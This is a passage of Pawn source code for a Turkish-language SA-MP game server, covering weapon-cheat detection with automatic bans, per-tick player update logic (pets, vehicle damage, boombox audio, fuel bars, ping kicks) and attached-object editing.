			//RemovePlayerWeapon(playerid, weaponid);
			PlayerInfo[playerid][pBanned] = 3;
			new playerip[32];
			GetPlayerIp(playerid, playerip, sizeof(playerip));
			format(String, sizeof(String), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Silah Hilesi (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
			PlayerInfo[playerid][pBanned] = 3;
			Log("logs/ban.log", String);
   			new ip[32];
			GetPlayerIp(playerid,ip,sizeof(ip));
			AddBan(ip);
			Kick(playerid);
			TotalAutoBan++;
        }
        else if(PlayerInfo[playerid][pGuns][4] != 29 && PlayerInfo[playerid][pAGuns][4] != 29 && GetPlayerWeapon(playerid) == 29)
        {
            if(PlayerInfo[playerid][pConnectTime] < 2)
    		{
		    	new WeaponName[32];
				GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
				new String[128];
    			format(String, sizeof(String), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Silah Hilesi (%s).", GetPlayerNameEx(playerid), WeaponName);
				SendClientMessageToAllEx(COLOR_LIGHTRED, String);
				SetPVarInt(playerid, "_HACK_WARNINGS", 0);
				//RemovePlayerWeapon(playerid, weaponid);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(String, sizeof(String), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Silah Hilesi (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", String);
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][5] != 30 && PlayerInfo[playerid][pAGuns][5] != 30 && GetPlayerWeapon(playerid) == 30)
        {
            if(PlayerInfo[playerid][pConnectTime] < 2)
    		{
		    	new WeaponName[32];
				GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
				new String[128];
    			format(String, sizeof(String), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Silah Hilesi (%s).", GetPlayerNameEx(playerid), WeaponName);
				SendClientMessageToAllEx(COLOR_LIGHTRED, String);
				SetPVarInt(playerid, "_HACK_WARNINGS", 0);
				//RemovePlayerWeapon(playerid, weaponid);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(String, sizeof(String), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Silah Hilesi (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", String);
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][5] != 31 && PlayerInfo[playerid][pAGuns][5] != 31 && GetPlayerWeapon(playerid) == 31)
        {
            if(PlayerInfo[playerid][pConnectTime] < 2)
    		{
		    	new WeaponName[32];
				GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
				new String[128];
    			format(String, sizeof(String), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Silah Hilesi (%s).", GetPlayerNameEx(playerid), WeaponName);
				SendClientMessageToAllEx(COLOR_LIGHTRED, String);
				SetPVarInt(playerid, "_HACK_WARNINGS", 0);
				//RemovePlayerWeapon(playerid, weaponid);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(String, sizeof(String), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Silah Hilesi (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", String);
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][4] != 32 && PlayerInfo[playerid][pAGuns][4] != 32 && GetPlayerWeapon(playerid) == 32)
        {
  			new WeaponName[32];
			GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
			new String[128];
			format(String, sizeof(String), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Silah Hilesi (%s).", GetPlayerNameEx(playerid), WeaponName);
			SendClientMessageToAllEx(COLOR_LIGHTRED, String);
			SetPVarInt(playerid, "_HACK_WARNINGS", 0);
			//RemovePlayerWeapon(playerid, weaponid);
			PlayerInfo[playerid][pBanned] = 3;
			new playerip[32];
			GetPlayerIp(playerid, playerip, sizeof(playerip));
			format(String, sizeof(String), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Silah Hilesi (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
			PlayerInfo[playerid][pBanned] = 3;
			Log("logs/ban.log", String);
			new ip[32];
			GetPlayerIp(playerid,ip,sizeof(ip));
			AddBan(ip);
			Kick(playerid);
			TotalAutoBan++;
        }
        else if(PlayerInfo[playerid][pGuns][6] != 33 && PlayerInfo[playerid][pAGuns][6] != 33 && GetPlayerWeapon(playerid) == 33)
        {
            if(PlayerInfo[playerid][pConnectTime] < 2)
    		{
		    	new WeaponName[32];
				GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
				new String[128];
    			format(String, sizeof(String), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Silah Hilesi (%s).", GetPlayerNameEx(playerid), WeaponName);
				SendClientMessageToAllEx(COLOR_LIGHTRED, String);
				SetPVarInt(playerid, "_HACK_WARNINGS", 0);
				//RemovePlayerWeapon(playerid, weaponid);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(String, sizeof(String), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Silah Hilesi (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", String);
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][6] != 34 && PlayerInfo[playerid][pAGuns][6] != 34 && GetPlayerWeapon(playerid) == 34)
        {
            if(PlayerInfo[playerid][pConnectTime] < 2)
    		{
		    	new WeaponName[32];
				GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
				new String[128];
    			format(String, sizeof(String), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Silah Hilesi (%s).", GetPlayerNameEx(playerid), WeaponName);
				SendClientMessageToAllEx(COLOR_LIGHTRED, String);
				SetPVarInt(playerid, "_HACK_WARNINGS", 0);
				//RemovePlayerWeapon(playerid, weaponid);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(String, sizeof(String), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Silah Hilesi (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", String);
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][7] != 35 && PlayerInfo[playerid][pAGuns][7] != 35 && GetPlayerWeapon(playerid) == 35)
        {
            new WeaponName[32];
			GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
			new String[128];
            format(String, sizeof(String), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Silah Hilesi (%s).", GetPlayerNameEx(playerid), WeaponName);
			SendClientMessageToAllEx(COLOR_LIGHTRED, String);
			SetPVarInt(playerid, "_HACK_WARNINGS", 0);
			//RemovePlayerWeapon(playerid, weaponid);
			PlayerInfo[playerid][pBanned] = 3;
			new playerip[32];
			GetPlayerIp(playerid, playerip, sizeof(playerip));
			format(String, sizeof(String), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Silah Hilesi (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
			PlayerInfo[playerid][pBanned] = 3;
			Log("logs/ban.log", String);
			new ip[32];
			GetPlayerIp(playerid,ip,sizeof(ip));
			AddBan(ip);
			Kick(playerid);
			TotalAutoBan++;
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][7] != 36 && PlayerInfo[playerid][pAGuns][7] != 36 && GetPlayerWeapon(playerid) == 36)
        {
            new WeaponName[32];
			GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
            new String[128];
			format(String, sizeof(String), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Silah Hilesi (%s).", GetPlayerNameEx(playerid), WeaponName);
			SendClientMessageToAllEx(COLOR_LIGHTRED, String);
			SetPVarInt(playerid, "_HACK_WARNINGS", 0);
			//RemovePlayerWeapon(playerid, weaponid);
			PlayerInfo[playerid][pBanned] = 3;
			new playerip[32];
			GetPlayerIp(playerid, playerip, sizeof(playerip));
			format(String, sizeof(String), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Silah Hilesi (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
			PlayerInfo[playerid][pBanned] = 3;
			Log("logs/ban.log", String);
			new ip[32];
			GetPlayerIp(playerid,ip,sizeof(ip));
			AddBan(ip);
			Kick(playerid);
			TotalAutoBan++;
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][7] != 37 && PlayerInfo[playerid][pAGuns][7] != 37 && GetPlayerWeapon(playerid) == 37)
        {
			new WeaponName[32];
			GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
			new String[128];
            format(String, sizeof(String), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Silah Hilesi (%s).", GetPlayerNameEx(playerid), WeaponName);
			SendClientMessageToAllEx(COLOR_LIGHTRED, String);
			SetPVarInt(playerid, "_HACK_WARNINGS", 0);
			//RemovePlayerWeapon(playerid, weaponid);
			PlayerInfo[playerid][pBanned] = 3;
			new playerip[32];
			GetPlayerIp(playerid, playerip, sizeof(playerip));
			format(String, sizeof(String), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Silah Hilesi (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
			PlayerInfo[playerid][pBanned] = 3;
			Log("logs/ban.log", String);
			new ip[32];
			GetPlayerIp(playerid,ip,sizeof(ip));
			AddBan(ip);
			Kick(playerid);
			TotalAutoBan++;
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][7] != 38 && PlayerInfo[playerid][pAGuns][7] != 38 && GetPlayerWeapon(playerid) == 38)
        {
            new WeaponName[32];
			GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
            new String[128];
			format(String, sizeof(String), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Silah Hilesi (%s).", GetPlayerNameEx(playerid), WeaponName);
			SendClientMessageToAllEx(COLOR_LIGHTRED, String);
			SetPVarInt(playerid, "_HACK_WARNINGS", 0);
			//RemovePlayerWeapon(playerid, weaponid);
			PlayerInfo[playerid][pBanned] = 3;
			new playerip[32];
			GetPlayerIp(playerid, playerip, sizeof(playerip));
			format(String, sizeof(String), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Silah Hilesi (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
			Log("logs/ban.log", String);
			new ip[32];
			GetPlayerIp(playerid,ip,sizeof(ip));
			AddBan(ip);
			Kick(playerid);
			TotalAutoBan++;
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][8] != 16 && PlayerInfo[playerid][pAGuns][8] != 16 && GetPlayerWeapon(playerid) == 16)
        {
            new WeaponName[32];
			GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
			new String[128];
            format(String, sizeof(String), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Silah Hilesi (%s).", GetPlayerNameEx(playerid), WeaponName);
			SendClientMessageToAllEx(COLOR_LIGHTRED, String);
			SetPVarInt(playerid, "_HACK_WARNINGS", 0);
			//RemovePlayerWeapon(playerid, weaponid);
			PlayerInfo[playerid][pBanned] = 3;
			new playerip[32];
			GetPlayerIp(playerid, playerip, sizeof(playerip));
			format(String, sizeof(String), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Silah Hilesi (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
			PlayerInfo[playerid][pBanned] = 3;
			Log("logs/ban.log", String);
			new ip[32];
			GetPlayerIp(playerid,ip,sizeof(ip));
			AddBan(ip);
			Kick(playerid);
			TotalAutoBan++;
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][8] != 17 && PlayerInfo[playerid][pAGuns][8] != 17 && GetPlayerWeapon(playerid) == 17)
        {
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][8] != 18 && PlayerInfo[playerid][pAGuns][8] != 18 && GetPlayerWeapon(playerid) == 18)
        {
            new WeaponName[32];
			GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
			new String[128];
            format(String, sizeof(String), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Silah Hilesi (%s).", GetPlayerNameEx(playerid), WeaponName);
			SendClientMessageToAllEx(COLOR_LIGHTRED, String);
			SetPVarInt(playerid, "_HACK_WARNINGS", 0);
			//RemovePlayerWeapon(playerid, weaponid);
			PlayerInfo[playerid][pBanned] = 3;
			new playerip[32];
			GetPlayerIp(playerid, playerip, sizeof(playerip));
			format(String, sizeof(String), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Silah Hilesi (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
			PlayerInfo[playerid][pBanned] = 3;
			Log("logs/ban.log", String);
			new ip[32];
			GetPlayerIp(playerid,ip,sizeof(ip));
			AddBan(ip);
			Kick(playerid);
			TotalAutoBan++;
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][8] != 39 && PlayerInfo[playerid][pAGuns][8] != 39 && GetPlayerWeapon(playerid) == 39)
        {
            new WeaponName[32];
			GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
			new String[128];
            format(String, sizeof(String), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Silah Hilesi (%s).", GetPlayerNameEx(playerid), WeaponName);
			SendClientMessageToAllEx(COLOR_LIGHTRED, String);
			SetPVarInt(playerid, "_HACK_WARNINGS", 0);
			//RemovePlayerWeapon(playerid, weaponid);
			PlayerInfo[playerid][pBanned] = 3;
			new playerip[32];
			GetPlayerIp(playerid, playerip, sizeof(playerip));
			format(String, sizeof(String), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Silah Hilesi (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
			PlayerInfo[playerid][pBanned] = 3;
			Log("logs/ban.log", String);
			new ip[32];
			GetPlayerIp(playerid,ip,sizeof(ip));
			AddBan(ip);
			Kick(playerid);
			TotalAutoBan++;
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][9] != 41 && PlayerInfo[playerid][pAGuns][9] != 41 && GetPlayerWeapon(playerid) == 41)
        {
            if(PlayerInfo[playerid][pConnectTime] < 2)
    		{
		    	new WeaponName[32];
				GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
				new String[128];
    			format(String, sizeof(String), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Silah Hilesi (%s).", GetPlayerNameEx(playerid), WeaponName);
				SendClientMessageToAllEx(COLOR_LIGHTRED, String);
				SetPVarInt(playerid, "_HACK_WARNINGS", 0);
				//RemovePlayerWeapon(playerid, weaponid);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(String, sizeof(String), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Silah Hilesi (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", String);
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][9] != 42 && PlayerInfo[playerid][pAGuns][9] != 42 && GetPlayerWeapon(playerid) == 42)
        {
            if(PlayerInfo[playerid][pConnectTime] < 2)
    		{
		    	new WeaponName[32];
				GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
				new String[128];
    			format(String, sizeof(String), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Silah Hilesi (%s).", GetPlayerNameEx(playerid), WeaponName);
				SendClientMessageToAllEx(COLOR_LIGHTRED, String);
				SetPVarInt(playerid, "_HACK_WARNINGS", 0);
				//RemovePlayerWeapon(playerid, weaponid);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(String, sizeof(String), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Silah Hilesi (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", String);
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][9] != 43 && PlayerInfo[playerid][pAGuns][9] != 43 && GetPlayerWeapon(playerid) == 43)
        {
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][10] != 10 && PlayerInfo[playerid][pAGuns][10] != 10 && GetPlayerWeapon(playerid) == 10)
        {
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][10] != 11 && PlayerInfo[playerid][pAGuns][10] != 11 && GetPlayerWeapon(playerid) == 11)
        {
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][10] != 12 && PlayerInfo[playerid][pAGuns][10] != 12 && GetPlayerWeapon(playerid) == 12)
        {
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][10] != 13 && PlayerInfo[playerid][pAGuns][10] != 13 && GetPlayerWeapon(playerid) == 13)
        {
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][10] != 14 && PlayerInfo[playerid][pAGuns][10] != 14 && GetPlayerWeapon(playerid) == 14)
        {
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][10] != 15 && PlayerInfo[playerid][pAGuns][10] != 15 && GetPlayerWeapon(playerid) == 15)
        {
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][11] != 44 && PlayerInfo[playerid][pAGuns][11] != 44 && GetPlayerWeapon(playerid) == 44)
        {
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][11] != 45 && PlayerInfo[playerid][pAGuns][11] != 45 && GetPlayerWeapon(playerid) == 45)
        {
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][11] != 46 && GetPlayerWeapon(playerid) == 46)
        {
        	PlayerInfo[playerid][pGuns][11] = 46;
        }
	}
	return 1;
}

public OnPlayerUpdate(playerid)
{
	if(playerTabbed[playerid] == 1)
	{
		playerTabbed[playerid] = 0;
		playerTabbedTime[playerid] = 0;
		if(GetPVarType(playerid, "tabbedVW") != 0) {
		    SetPlayerVirtualWorld(playerid, GetPVarInt(playerid, "tabbedVW"));
		    DeletePVar(playerid, "tabbedVW");
		}
	}
	if(PlayerInfo[playerid][pPetKontrol] == 1)
	{
	    new saglikdurumu[128], str[256];
	    
        foreach (new i : Player) {
			ShowPlayerNameTagForPlayer(i, playerid, 0);
		}
		SetPlayerArmedWeapon(playerid, 0);
	 	if(PlayerInfo[playerid][pPetCani] < 30) format(saglikdurumu, sizeof(saglikdurumu), "{FF0000}Yaralý{FFFFFF}");
		else if(PlayerInfo[playerid][pPetCani] < 50) format(saglikdurumu, sizeof(saglikdurumu), "{FFA500}Hasta{FFFFFF}");
		else if(PlayerInfo[playerid][pPetCani] <= 100 || PlayerInfo[playerid][pPetCani] > 100) format(saglikdurumu, sizeof(saglikdurumu), "{00FF00}Saðlýklý{FFFFFF}");
		if(!PlayerInfo[playerid][pTagAktif])
		{
			PlayerInfo[playerid][pTagAktif] = 1;
	    	format(str, sizeof(str), "{FFFFFF}[ {FF0000}%s{FF00F0} (%d){FFFFFF} ]\n\n%s", PlayerInfo[playerid][pPetAdi], playerid, saglikdurumu);
			KontrolText[playerid] = CreateDynamic3DTextLabel(str, -1, 0.0, 0.0, 0.1, 8.0, playerid, INVALID_VEHICLE_ID, 0, -1, -1);
		}
	}
	else if (PlayerInfo[playerid][pPetKontrol] == 0)
	{
	    foreach (new i : Player) {
			ShowPlayerNameTagForPlayer(i, playerid, 1);
		}
		PlayerInfo[playerid][pTagAktif] = 0;
		IsimTagSifirla(playerid);
	}
    foreach(Player, i)
	{
 		if(GetPlayerState(i) == 2)
		{
      		new vehicleid = GetPlayerVehicleID(i);
			GetVehicleHealth(vehicleid,explodehealth);
			GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
			if(explodehealth < 300.0 && engine == VEHICLE_PARAMS_ON)
			{
				RemovePlayerFromVehicle(playerid);
				GameTextForPlayer(i, "~r~Arac Kullanilmaz Halde!", 2500, 3);
	            SetVehicleParamsEx(vehicleid, false, lights, alarm, doors, bonnet, boot, objective);
                SendClientMessage(i, COLOR_WHITE, "Arac kullanilmaz halde, tamirci çaðýr ve aracýný tamir ettir.");
				engine = 0;
				return 1;

			}
			if(explodehealth < 300.0 && engine == VEHICLE_PARAMS_OFF)
		    {

  			}
		}
	}
	if(PlayerInfo[playerid][pSkin] > 20000)
 	{
	    if(PlayerInfo[playerid][pPetKontrol] == 0)
	 	{
	 	    printf("%s, skin %d cinsiyet %d", GetPlayerNameEx(playerid), GetPlayerSkin(playerid), PlayerInfo[playerid][pSex]);
		    if(PlayerInfo[playerid][pSex] == 1)
		    {
		        SetPlayerSkin(playerid, 240);
		        PlayerInfo[playerid][pSkin] = 240;
				HataMesajiYolla(playerid, "Özel modeller kaldýrýlmýþtýr, kýyafetiniz erkek cinsiyetinden dolayý 240 olarak deðiþtirildi.");
		    }
	     	else if(PlayerInfo[playerid][pSex] == 2)
		    {
		        SetPlayerSkin(playerid, 93);
		        PlayerInfo[playerid][pSkin] = 93;
		        HataMesajiYolla(playerid, "Özel modeller kaldýrýlmýþtýr, kýyafetiniz bayan cinsiyetinden dolayý 93 olarak deðiþtirildi.");
		    }
		}
	}
	if(!BoomboxStream[playerid])
    {
        for(new i=0; i<MAX_PLAYERS; i++)
        {
            if(IsPlayerConnected(i))
            {
                if(Boombox[i])
                {
                    if(IsPlayerInRangeOfPoint(playerid, 30, bpos[i][0], bpos[i][1], bpos[i][2]))
                    {
                        PlayAudioStreamForPlayer(playerid, BoomboxURL[i], bpos[i][0], bpos[i][1], bpos[i][2], 30, 1);
                        BoomboxPlayer[playerid] = i;
                        BoomboxStream[playerid] = 1;
                        SendClientMessage(playerid, COLOR_WHITE, "Yakýndan gelen bir müzik sesini dinlemeye baþladýn!");
                    }
                }
            }
        }
    }
    else
    {
        new i = BoomboxPlayer[playerid];
        if(!IsPlayerInRangeOfPoint(playerid, 30, bpos[i][0], bpos[i][1], bpos[i][2]))
        {
            BoomboxStream[playerid] = 0;
            BoomboxPlayer[playerid] = -1;
            StopAudioStreamForPlayer(playerid);
            SendClientMessage(playerid, COLOR_WHITE, "Boombox kutusundan uzaklaþtýn, artýk müziði duyamýyorsun!");
        }
    }
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && Speedlimit[playerid])
	{
	    new a, b, c;
		GetPlayerKeys(playerid, a, b ,c);
	    if(a == 8 && GetVehicleSpeed(GetPlayerVehicleID(playerid), 0) > Speedlimit[playerid])
	    {
	        new newspeed = GetVehicleSpeed(GetPlayerVehicleID(playerid), 0) - Speedlimit[playerid];
	    	ModifyVehicleSpeed(GetPlayerVehicleID(playerid), -newspeed);
	    }
	}
	if(IsPlayerConnected(playerid) && GetPlayerPing(playerid) > MAX_PING)
    {
        new oyuncuisim[20],yazi[256];
        GetPlayerName(playerid,oyuncuisim,20);
        format(yazi,256,"%s adli oyuncu yuksek ping nedeniyle sunucudan atildi. (%d/%d)",oyuncuisim,GetPlayerPing(playerid),MAX_PING);
        SendClientMessageToAll(COLOR_WHITE,yazi);
        Kick(playerid);
    }
	foreach(Player, i)
	{
		if(IsPlayerInAnyVehicle(i))
		{
			SetProgressBarValue(FuelBar[i], Fuel[GetPlayerVehicleID(i)]);
	    	UpdateProgressBar(FuelBar[i], i);
 		}
 		else
 		{
 		    HideProgressBarForPlayer(i, FuelBar[i]);
	    	DeletePVar(i, "fuelonoff");
	    	FuelBar[i] = INVALID_BAR_ID;
    		DestroyProgressBar(FuelBar[i]);
		}
	}
	if(isrefuelling[playerid] == 1)
	{
		SetPVarInt(playerid, "fuelonoff", 0);
  		HideProgressBarForPlayer(playerid, FuelBar[playerid]);
		DestroyProgressBar(FuelBar[playerid]);
		FuelBar[playerid] = INVALID_BAR_ID;
	}
	playerSeconds[playerid] = gettime();

	if(GetPVarInt(playerid, "IsFrozen") == 1) TogglePlayerControllable(playerid, 0);

	new pCurWeap = GetPlayerWeapon(playerid);
    if(pCurWeap != pCurrentWeapon[playerid])
    {
        OnPlayerChangeWeapon(playerid, pCurWeap);
        pCurrentWeapon[playerid] = pCurWeap;
    }
	return 1;
}

public OnPlayerEditAttachedObject(playerid, response, index, modelid, boneid, Float:fOffsetX, Float:fOffsetY, Float:fOffsetZ, Float:fRotX, Float:fRotY, Float:fRotZ, Float:fScaleX, Float:fScaleY, Float:fScaleZ)
{
    if(response)
    {
		if(fScaleX < 0.1) fScaleX = 0.1;
		if(fScaleX > 1.5) fScaleX = 1.5;
		if(fScaleY < 0.1) fScaleY = 0.1;
		if(fScaleY > 1.5) fScaleY = 1.5;
		if(fScaleZ < 0.1) fScaleZ = 0.1;
		if(fScaleZ > 1.5) fScaleZ = 1.5;
		if(fOffsetX < -100) fOffsetX = 0;
		if(fOffsetX > 100) fOffsetX = 100;
		if(fOffsetY < -100) fOffsetY = 0;
		if(fOffsetY > 100) fOffsetY = 100;
		if(fOffsetZ < -100) fOffsetZ = 0;
		if(fOffsetZ > 100) fOffsetZ = 100;

		SendClientMessage(playerid, COLOR_WHITE, "Oyuncak pozisyonu kaydedildi.");

		PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = fOffsetX;
		PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = fOffsetY;
		PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = fOffsetZ;
		PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = fRotX;
		PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = fRotY;
		PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = fRotZ;
		PlayerToyInfo[playerid][slotselection[playerid]][ptScaleX] = fScaleX;
		PlayerToyInfo[playerid][slotselection[playerid]][ptScaleY] = fScaleY;
		PlayerToyInfo[playerid][slotselection[playerid]][ptScaleZ] = fScaleZ;

		RemovePlayerAttachedObject(playerid, slotselection[playerid]);
		SetPlayerAttachedObject(playerid, slotselection[playerid], PlayerToyInfo[playerid][slotselection[playerid]][ptModelID],
		PlayerToyInfo[playerid][slotselection[playerid]][ptBone], PlayerToyInfo[playerid][slotselection[playerid]][ptPosX],
		PlayerToyInfo[playerid][slotselection[playerid]][ptPosY], PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ],
		PlayerToyInfo[playerid][slotselection[playerid]][ptRotX], PlayerToyInfo[playerid][slotselection[playerid]][ptRotY],
		PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ], PlayerToyInfo[playerid][slotselection[playerid]][ptScaleX],
		PlayerToyInfo[playerid][slotselection[playerid]][ptScaleY], PlayerToyInfo[playerid][slotselection[playerid]][ptScaleZ]);
    }  else  {
        SendClientMessage(playerid, COLOR_GREY, "Oyuncak pozisyonu kaydedilmedi.");
		RemovePlayerAttachedObject(playerid, slotselection[playerid]);
    }
    return 1;
}

stock ShowEditMenu(playerid)
{
    if(IsPlayerAttachedObjectSlotUsed(playerid, slotselection[playerid]))
	{
 		RemovePlayerAttachedObject(playerid, slotselection[playerid]);
	}
	if(PlayerToyInfo[playerid][slotselection[playerid]][ptScaleX] == 0) {
		PlayerToyInfo[playerid][slotselection[playerid]][ptScaleX] = 1.0;
		PlayerToyInfo[playerid][slotselection[playerid]][ptScaleY] = 1.0;
		PlayerToyInfo[playerid][slotselection[playerid]][ptScaleZ] = 1.0;
	}

	SetPlayerAttachedObject(playerid, slotselection[playerid], PlayerToyInfo[playerid][slotselection[playerid]][ptModelID],
	PlayerToyInfo[playerid][slotselection[playerid]][ptBone], PlayerToyInfo[playerid][slotselection[playerid]][ptPosX],
	PlayerToyInfo[playerid][slotselection[playerid]][ptPosY], PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ],
